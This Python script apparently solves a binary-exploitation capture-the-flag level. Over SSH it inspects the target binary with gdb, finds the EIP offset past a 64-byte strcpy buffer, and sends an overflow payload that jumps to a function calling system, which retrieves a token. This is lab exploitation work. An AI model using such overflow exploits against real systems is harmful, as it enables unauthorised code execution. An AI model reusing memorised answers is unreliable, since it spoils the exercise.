import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, find_offset, get_func_address, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, get_buffer_overflow_command

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'./{binary_name}', title='Simple execute binary', err=True)
print_output(output, 'Output')
print_title('Segfault, sad')

output = exec(client, f'./{binary_name} test', title='Send one arg')
print_output(output, 'Output')
print_title('Nope, oh... Okay')
print_title('Debug Time')

func_info = exec(
    client, f'echo "info func" | gdb ./{binary_name} -q | egrep " n$| main$| m$"', title='Get all functions')
print_output(func_info)
print_title('We have three entry points')

get_func_structure(client, 'main', title='Copy argv to buffer (+73)\n'
                                         'Call function m (+84)')
get_func_structure(client, 'm', title='Write string to stdout (+13)')
get_func_structure(client, 'n', title='System call (+13)')

eip_offset = find_offset(
    client, title='Find EIP offset by our binary to rewrite it and overflow strcpy 64 byte buffer')
n_address = get_func_address(client, 'n')

token = exec(
    client, f'./{binary_name} $({get_buffer_overflow_command(eip_offset, n_address)})',
    title=f'Send exploit to binary\n'
          f'Offset and call function by address, perfect')[0]
print_output(token, 'Output')

save_token(token, client)

